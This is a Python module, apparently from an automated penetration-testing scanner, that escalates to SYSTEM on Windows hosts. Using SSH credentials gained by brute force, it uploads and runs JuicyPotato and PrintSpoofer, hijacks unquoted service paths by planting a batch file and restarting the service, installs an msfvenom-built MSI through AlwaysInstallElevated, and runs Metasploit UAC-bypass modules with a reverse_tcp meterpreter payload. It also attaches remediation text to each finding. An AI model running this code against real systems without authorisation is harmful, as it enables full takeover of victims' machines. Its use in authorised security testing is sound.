"""
Windows Privilege Escalation module — Phase 8.3.
Reads WinPEAS vectors from postex findings, attempts:
  - JuicyPotato / PrintSpoofer (SeImpersonatePrivilege)
  - Unquoted service path hijack
  - AlwaysInstallElevated MSI trick
  - UAC bypass via MSF (bypassuac_eventvwr / fodhelper)
  - whoami /priv verification
Only runs on scan_type == 'full' and when Windows host detected.
"""
from __future__ import annotations

import re
import shutil
import tempfile
from pathlib import Path
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult
from app.scanner.post_exploit import _ssh_exec, _extract_ssh_sessions

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


# ── Tool paths (pre-installed in scanner image) ───────────────────────────────

_JUICY_PATH   = Path("/opt/JuicyPotato/JuicyPotato.exe")
_PRINT_PATH   = Path("/opt/PrintSpoofer/PrintSpoofer64.exe")
_MSF_UAC_MODULES = [
    "exploit/windows/local/bypassuac_eventvwr",
    "exploit/windows/local/bypassuac_fodhelper",
    "exploit/windows/local/bypassuac_sdclt",
    "exploit/windows/local/bypassuac_sluihijack",
]

# CLSID table for JuicyPotato (OS → CLSID)
_JUICY_CLSIDS: dict[str, str] = {
    "windows server 2019": "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}",
    "windows server 2016": "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}",
    "windows server 2012": "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}",
    "windows 10":          "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}",
    "windows 7":           "{4991D34B-80A1-4291-83B6-3328366B9097}",
    "default":             "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}",
}


# ── Vector extraction from WinPEAS findings ───────────────────────────────────

def _has_seimpersonate(postex_findings: list[Finding]) -> bool:
    for f in postex_findings:
        if "impersonat" in (f.title or "").lower() or "impersonat" in (f.evidence or "").lower():
            return True
    return False


def _get_unquoted_paths(postex_findings: list[Finding]) -> list[str]:
    paths: list[str] = []
    for f in postex_findings:
        if "unquoted" not in (f.title or "").lower():
            continue
        for m in re.finditer(r"([A-Z]:\\[^\n\"]+\.exe)", f.evidence or "", re.IGNORECASE):
            paths.append(m.group(1))
    return paths


def _has_always_install_elevated(postex_findings: list[Finding]) -> bool:
    for f in postex_findings:
        if "alwaysinstallelevated" in (f.title or "").lower():
            return True
    return False


def _has_uac_disabled(postex_findings: list[Finding]) -> bool:
    for f in postex_findings:
        if "uac" in (f.title or "").lower() and "disabled" in (f.title or "").lower():
            return True
    return False


def _get_os_version(nmap_findings: list[Finding]) -> str:
    for f in nmap_findings:
        for src in (f.description or "", f.evidence or "", f.title or ""):
            m = re.search(r"(windows\s+(?:server\s+)?\d+(?:\s+r2)?)", src, re.IGNORECASE)
            if m:
                return m.group(1).lower()
    return "default"


def _is_root_windows(output: str) -> bool:
    """Check if whoami output shows NT AUTHORITY\\SYSTEM or Administrator."""
    return bool(re.search(
        r"nt authority\\system|administrator|SeDebugPrivilege.*Enabled",
        output, re.IGNORECASE,
    ))


# ── JuicyPotato ──────────────────────────────────────────────────────────────

async def _try_juicy_potato(
    ctx: "ScanContext",
    host: str,
    user: str,
    password: str,
    os_version: str,
) -> tuple[bool, str]:
    if not _JUICY_PATH.exists():
        return False, "JuicyPotato.exe not found in scanner image"

    clsid = _JUICY_CLSIDS.get(os_version, _JUICY_CLSIDS["default"])
    remote = "C:\\Windows\\Temp\\jp.exe"

    # Upload
    from app.scanner.post_exploit import _ssh_upload_exec
    await ctx.log(f"privesc_windows: uploading JuicyPotato to {host}", module="privesc_windows")

    # Build command: jp.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {CLSID}
    cmd = f"{remote} -l 1337 -p cmd.exe -a \"/c whoami\" -t * -c {clsid}"
    ok, output = _ssh_upload_exec(host, user, password, str(_JUICY_PATH), remote, cmd, timeout=30)
    return ok, output


# ── PrintSpoofer ─────────────────────────────────────────────────────────────

async def _try_print_spoofer(
    ctx: "ScanContext",
    host: str,
    user: str,
    password: str,
) -> tuple[bool, str]:
    if not _PRINT_PATH.exists():
        return False, "PrintSpoofer64.exe not found in scanner image"

    from app.scanner.post_exploit import _ssh_upload_exec
    remote = "C:\\Windows\\Temp\\ps64.exe"
    await ctx.log(f"privesc_windows: uploading PrintSpoofer to {host}", module="privesc_windows")

    cmd = f"{remote} -i -c whoami"
    ok, output = _ssh_upload_exec(host, user, password, str(_PRINT_PATH), remote, cmd, timeout=30)
    return ok, output


# ── Unquoted service path hijack ─────────────────────────────────────────────

async def _try_unquoted_service(
    ctx: "ScanContext",
    host: str,
    user: str,
    password: str,
    service_path: str,
) -> tuple[bool, str]:
    """
    Place a malicious exe at the unquoted path gap, then restart the service.
    E.g. C:\\Program Files\\My App\\service.exe → try C:\\Program.exe
    """
    # Find first space in path to determine hijack location
    parts = service_path.split(" ")
    if len(parts) < 2:
        return False, "no space found in service path"

    hijack_path = parts[0] + ".exe"
    await ctx.log(
        f"privesc_windows: unquoted service hijack at {hijack_path} on {host}",
        module="privesc_windows",
    )

    # Drop a simple cmd.exe wrapper that writes whoami output
    payload_cmd = (
        f"cmd.exe /c \"whoami > C:\\Windows\\Temp\\privesc_proof.txt\""
    )
    # Write a bat file at the hijack path
    write_cmd = f"echo @echo off > {hijack_path} && echo {payload_cmd} >> {hijack_path}"
    ok, _ = _ssh_exec(host, user, password, write_cmd, timeout=10)
    if not ok:
        return False, f"could not write to {hijack_path}"

    # Extract service name from path and restart it
    svc_name_m = re.search(r"([^\\]+)\.exe$", service_path, re.IGNORECASE)
    if not svc_name_m:
        return False, "could not extract service name"

    svc_name = svc_name_m.group(1)
    _ssh_exec(host, user, password, f"sc stop {svc_name} & sc start {svc_name}", timeout=15)

    import asyncio
    await asyncio.sleep(5)

    ok, proof = _ssh_exec(host, user, password, "type C:\\Windows\\Temp\\privesc_proof.txt", timeout=10)
    _ssh_exec(host, user, password, f"del C:\\Windows\\Temp\\privesc_proof.txt & del {hijack_path}", timeout=5)
    return ok and _is_root_windows(proof), proof


# ── AlwaysInstallElevated MSI ────────────────────────────────────────────────

async def _try_always_install_elevated(
    ctx: "ScanContext",
    host: str,
    user: str,
    password: str,
) -> tuple[bool, str]:
    """Generate a malicious MSI with msfvenom and run it."""
    if not shutil.which("msfvenom"):
        return False, "msfvenom not available"

    await ctx.log(f"privesc_windows: AlwaysInstallElevated MSI on {host}", module="privesc_windows")

    with tempfile.NamedTemporaryFile(suffix=".msi", delete=False) as f:
        msi_path = f.name

    try:
        from app.scanner.base import run_cmd
        rc, _, err = run_cmd([
            "msfvenom", "-p", "windows/exec",
            f"CMD=whoami > C:\\Windows\\Temp\\privesc_proof.txt",
            "-f", "msi", "-o", msi_path,
        ], timeout=30)
        if rc != 0:
            return False, f"msfvenom failed: {err[:200]}"

        from app.scanner.post_exploit import _ssh_upload_exec
        remote_msi = "C:\\Windows\\Temp\\setup.msi"
        ok, output = _ssh_upload_exec(
            host, user, password,
            msi_path, remote_msi,
            f"msiexec /quiet /i {remote_msi}",
            timeout=30,
        )
        if not ok:
            return False, output

        import asyncio
        await asyncio.sleep(5)

        ok, proof = _ssh_exec(host, user, password, "type C:\\Windows\\Temp\\privesc_proof.txt", timeout=10)
        _ssh_exec(host, user, password, f"del C:\\Windows\\Temp\\privesc_proof.txt & del {remote_msi}", timeout=5)
        return ok and _is_root_windows(proof), proof
    finally:
        Path(msi_path).unlink(missing_ok=True)


# ── UAC bypass via MSF ────────────────────────────────────────────────────────

async def _try_uac_bypass_msf(
    ctx: "ScanContext",
    target: str,
    session_ids: list[str],
) -> tuple[bool, str]:
    if not session_ids:
        return False, "no MSF session"

    try:
        from pymetasploit3.msfrpc import MsfRpcClient  # type: ignore
        client = MsfRpcClient("msf", port=55553, ssl=False)
    except Exception:
        return False, "MSF RPC unavailable"

    sid = session_ids[0]
    for module_path in _MSF_UAC_MODULES:
        try:
            await ctx.log(f"privesc_windows: UAC bypass {module_path} session {sid}", module="privesc_windows")
            exploit = client.modules.use("exploit", module_path)
            exploit["SESSION"] = sid
            exploit["PAYLOAD"] = "windows/meterpreter/reverse_tcp"
            exploit["LHOST"] = "127.0.0.1"
            exploit["LPORT"] = 4445
            job_id = exploit.execute(payload=exploit["PAYLOAD"])

            import asyncio
            await asyncio.sleep(10)

            # Check for new session
            sessions = client.sessions.list
            for new_sid, info in sessions.items():
                if new_sid != sid and info.get("via_exploit") == module_path:
                    whoami = client.sessions.session(new_sid).run_with_output("getuid", timeout=10)
                    if _is_root_windows(whoami):
                        return True, f"UAC bypassed via {module_path}\n{whoami}"
        except Exception as e:
            await ctx.log(f"privesc_windows: {module_path} failed: {e}", level="warning", module="privesc_windows")
            continue

    return False, "all UAC bypass modules failed"


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_privesc_windows(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    nmap_findings: list[Finding],
    postex_findings: list[Finding],
    brute_findings: list[Finding],
    msf_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    if scan_type != "full":
        return result

    # Only run if Windows host confirmed
    from app.scanner.post_exploit import _is_windows, _extract_msf_sessions
    if not _is_windows(nmap_findings):
        await ctx.log("privesc_windows: not a Windows host, skipping", module="privesc_windows")
        return result

    ssh_sessions = _extract_ssh_sessions(brute_findings)
    msf_sessions  = _extract_msf_sessions(msf_findings)
    os_version    = _get_os_version(nmap_findings)

    if not ssh_sessions and not msf_sessions:
        await ctx.log("privesc_windows: no sessions available", level="warning", module="privesc_windows")
        return result

    has_impersonate     = _has_seimpersonate(postex_findings)
    unquoted_paths      = _get_unquoted_paths(postex_findings)
    has_aie             = _has_always_install_elevated(postex_findings)
    has_uac_disabled    = _has_uac_disabled(postex_findings)

    await ctx.log(
        f"privesc_windows: SeImpersonate={has_impersonate}, "
        f"unquoted={len(unquoted_paths)}, AIE={has_aie}, UAC_disabled={has_uac_disabled}",
        module="privesc_windows",
    )

    # Collect whoami /priv from existing session for evidence
    priv_output = ""
    if ssh_sessions:
        host, user, password = ssh_sessions[0]
        _, priv_output = _ssh_exec(host, user, password, "whoami /priv", timeout=10)

    def _make_finding(title: str, description: str, evidence: str, remediation: str) -> Finding:
        return Finding(
            type="postex",
            title=title,
            severity="critical",
            description=description,
            evidence=evidence,
            remediation=remediation,
            cvss_score=9.8,
        )

    # 1. SeImpersonatePrivilege → JuicyPotato / PrintSpoofer
    if has_impersonate and ssh_sessions:
        host, user, password = ssh_sessions[0]

        # Try PrintSpoofer first (works on Windows 10/Server 2019+)
        ok, output = await _try_print_spoofer(ctx, host, user, password)
        if ok and _is_root_windows(output):
            await ctx.log("privesc_windows: ROOT via PrintSpoofer!", level="error", module="privesc_windows")
            result.findings.append(_make_finding(
                "Privilege escalation to SYSTEM via PrintSpoofer (SeImpersonatePrivilege)",
                f"PrintSpoofer exploited SeImpersonatePrivilege on {target}.\n\nProof:\n{output[:400]}",
                f"SYSTEM confirmed via PrintSpoofer: {output[:200]}",
                "Patch Windows to latest. Remove SeImpersonatePrivilege from service accounts. "
                "Apply 'Restrict access to null session pipes and shares' GPO.",
            ))
        else:
            # Fallback: JuicyPotato
            ok, output = await _try_juicy_potato(ctx, host, user, password, os_version)
            if ok and _is_root_windows(output):
                await ctx.log("privesc_windows: ROOT via JuicyPotato!", level="error", module="privesc_windows")
                result.findings.append(_make_finding(
                    "Privilege escalation to SYSTEM via JuicyPotato (SeImpersonatePrivilege)",
                    f"JuicyPotato exploited SeImpersonatePrivilege on {target}.\n\nProof:\n{output[:400]}",
                    f"SYSTEM confirmed via JuicyPotato: {output[:200]}",
                    "Patch Windows to KB3164035 or later. Remove SeImpersonatePrivilege. "
                    "Deploy Windows Defender Credential Guard.",
                ))

    if result.findings:
        return result

    # 2. Unquoted service path
    if unquoted_paths and ssh_sessions:
        host, user, password = ssh_sessions[0]
        for svc_path in unquoted_paths[:3]:
            ok, output = await _try_unquoted_service(ctx, host, user, password, svc_path)
            if ok:
                await ctx.log("privesc_windows: ROOT via unquoted service path!", level="error", module="privesc_windows")
                result.findings.append(_make_finding(
                    f"Privilege escalation via unquoted service path: {svc_path[:60]}",
                    f"Unquoted service path hijack succeeded on {target}.\n"
                    f"Path: {svc_path}\n\nProof:\n{output[:400]}",
                    f"SYSTEM confirmed via unquoted path {svc_path}: {output[:200]}",
                    f"Quote the service binary path: sc config <svc> binPath= '\"{svc_path}\"'. "
                    "Audit all services with: `wmic service get name,pathname` | findstr /i /v 'C:\\\\Windows'.",
                ))
                break

    if result.findings:
        return result

    # 3. AlwaysInstallElevated
    if has_aie and ssh_sessions:
        host, user, password = ssh_sessions[0]
        ok, output = await _try_always_install_elevated(ctx, host, user, password)
        if ok:
            await ctx.log("privesc_windows: ROOT via AlwaysInstallElevated!", level="error", module="privesc_windows")
            result.findings.append(_make_finding(
                "Privilege escalation via AlwaysInstallElevated MSI",
                f"AlwaysInstallElevated=1 allowed SYSTEM-level MSI execution on {target}.\n\nProof:\n{output[:400]}",
                f"SYSTEM confirmed via MSI: {output[:200]}",
                "Disable AlwaysInstallElevated via GPO: "
                "Computer/User Configuration → Administrative Templates → Windows Components → "
                "Windows Installer → 'Always install with elevated privileges' = Disabled.",
            ))

    if result.findings:
        return result

    # 4. UAC bypass via MSF
    if msf_sessions:
        ok, output = await _try_uac_bypass_msf(ctx, target, msf_sessions)
        if ok:
            await ctx.log("privesc_windows: ROOT via UAC bypass!", level="error", module="privesc_windows")
            result.findings.append(_make_finding(
                "Privilege escalation via UAC bypass (Metasploit)",
                f"UAC bypass succeeded on {target}.\n\nDetails:\n{output[:400]}",
                f"SYSTEM confirmed via UAC bypass: {output[:200]}",
                "Enable UAC to highest level. Apply all Windows security patches. "
                "Use Windows Defender Application Control (WDAC) to block unsigned code.",
            ))

    # Even if no escalation succeeded, report whoami /priv as evidence
    if not result.findings and priv_output:
        result.findings.append(Finding(
            type="postex",
            title="Windows privilege audit: no direct escalation path found",
            severity="info",
            description=(
                f"Attempted privilege escalation on {target} — no vector succeeded.\n"
                f"Current privileges:\n{priv_output[:500]}"
            ),
            evidence=priv_output[:400],
            remediation="Continue patching and monitor for new PrivEsc techniques.",
            cvss_score=None,
        ))

    return result
